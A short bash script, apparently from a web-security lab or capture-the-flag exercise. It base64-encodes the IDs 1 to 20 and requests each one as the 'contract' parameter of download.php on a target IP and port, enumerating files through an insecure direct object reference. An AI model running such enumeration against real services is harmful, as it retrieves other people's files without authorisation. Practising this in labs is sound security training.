#!/bin/bash

for i in {1..20}; do
    for encoded in $(echo -n $i | base64 -w 0); do
        curl --get --data-urlencode "contract=$encoded" "http://142.93.39.188:32262/download.php"
    done
done
